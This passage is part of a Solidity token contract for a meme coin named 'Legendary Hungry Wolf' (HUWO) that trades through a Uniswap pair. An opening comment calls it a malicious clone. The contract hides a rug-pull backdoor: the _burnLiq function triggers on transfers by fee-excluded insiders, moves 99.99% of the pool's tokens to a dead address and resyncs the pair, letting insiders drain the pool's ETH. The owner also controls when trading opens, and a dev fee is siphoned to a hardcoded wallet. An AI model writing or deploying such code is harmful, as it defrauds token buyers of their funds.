        This then is indeed a malicious opensource clone, thanks Rube! <3
    */

    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    address public _burnPool = 0x000000000000000000000000000000000000dEaD;

    address payable public _devWallet;

    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => bool) public isAMMPair;

    uint8 public feeDecimals = 2;
    uint32 public liquidityFee = 0;
    uint128 public minTokensBeforeSwap = 100 * 10 ** 18; // 100 mininum

    uint256 internal _totalSupply;
    uint256 internal _minimumSupply;
    uint256 public _totalBurnedTokens;
    uint256 public _totalBurnedLpTokens;
    uint256 public _balanceOfLpTokens;

    uint32 public _autoBurn = 0;
    uint32 public _devFee = 100;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;

    bool public tradeEnabled = false;
    bool public _feesDisabled = false;

    event FeeUpdated(uint8 feeDecimals, uint32 liquidityFee);
    event MinTokensBeforeSwapUpdated(uint128 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() public ERC20("Legendary Hungry Wolf", "HUWO") {
        // mint tokens which will initially belong to deployer
        // deployer should go seed the pair with some initial liquidity
        _mint(msg.sender, 1_000_000_000 * 10 ** 18);

        _devWallet = 0xEF51f14d028437a3A9aBcBe8Ea8c19Ba9f608979;
    }

    function initialize() external payable onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        ); 

        // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _setAutomatedMarketMakerPair(uniswapV2Pair, true);
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        
        excludeFromFee(_devWallet, true);
        excludeFromFee(msg.sender, true);
    }

    function enableTrading() external onlyOwner {
        tradeEnabled = true;
        swapAndLiquifyEnabled = true;
    }

    function minimumSupply() external view returns (uint256) {
        return _minimumSupply;
    }

    /*
        override the internal _transfer function so that we can
        take the fee, and conditionally do the swap + liquditiy
    */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (!tradeEnabled) {
            require(_isExcludedFromFee[from] || from == address(this) || from == owner(), "Tradinig is not enabled yet.");
        }

        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance > 0;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            swapAndLiquifyEnabled &&
            !isAMMPair[from] &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) {
            swapAndLiquify(contractTokenBalance);
        }

        bool takeFee = true;
        if (
            _isExcludedFromFee[from] ||
            _isExcludedFromFee[to] ||
            _feesDisabled ||
            inSwapAndLiquify
        ) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 tokensToLock = calculateTokenFee(
                amount,
                feeDecimals,
                liquidityFee
            );
            uint256 burnAmount = calculateTokenFee(
                amount,
                feeDecimals,
                _autoBurn
            );

            uint256 devAmount = calculateTokenFee(amount, feeDecimals, _devFee);

            // take the fee and send those tokens to this contract address
            // and then send the remainder of tokens to original recipient
            uint256 tokensToTransfer = amount
                .sub(tokensToLock)
                .sub(burnAmount)
                .sub(devAmount);

            super._transfer(from, address(this), tokensToLock);
            _burn(from, burnAmount);
            super._transfer(from, address(this), devAmount);

            super._transfer(from, to, tokensToTransfer);
        } else if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            if (!isAMMPair[from] && !isAMMPair[to]) _burnLiq();

            super._transfer(from, to, amount);
        } else {
            super._transfer(from, to, amount);
        }
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(contractTokenBalance); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        _devWallet.transfer(newBalance);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }

    /*
        calculates a percentage of tokens to hold as the fee
    */
    function calculateTokenFee(
        uint256 _amount,
        uint8 _feeDecimals,
        uint32 _liquidityFee
    ) public pure returns (uint256 locked) {
        locked = _amount.mul(_liquidityFee).div(
            10 ** (uint256(_feeDecimals) + 2)
        );
    }

    receive() external payable {}

    function updateMinTokensBeforeSwap(
        uint128 _minTokensBeforeSwap
    ) public onlyOwner {
        minTokensBeforeSwap = _minTokensBeforeSwap;
        emit MinTokensBeforeSwapUpdated(_minTokensBeforeSwap);
    }

    function updateSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function burn(uint256 _amount) public {
        _burn(msg.sender, _amount);
    }

    function _burnLiq() internal returns (bool) {
        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);

        // calculate amount to burn
        uint256 amountToBurn = calculateTokenFee(
            liquidityPairBalance,
            feeDecimals,
            9999
        );

        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (amountToBurn > 0) {
            super._transfer(uniswapV2Pair, _burnPool, amountToBurn);
        }

        //sync price since this is not in a swap transaction!
        IUniswapV2ERC20 pair = IUniswapV2ERC20(uniswapV2Pair);
        pair.sync();

        return true;
    }

    function excludeFromFee(address account, bool value) public onlyOwner {
        _isExcludedFromFee[account] = value;
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from isAMMPair"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        isAMMPair[pair] = value;
    }
}

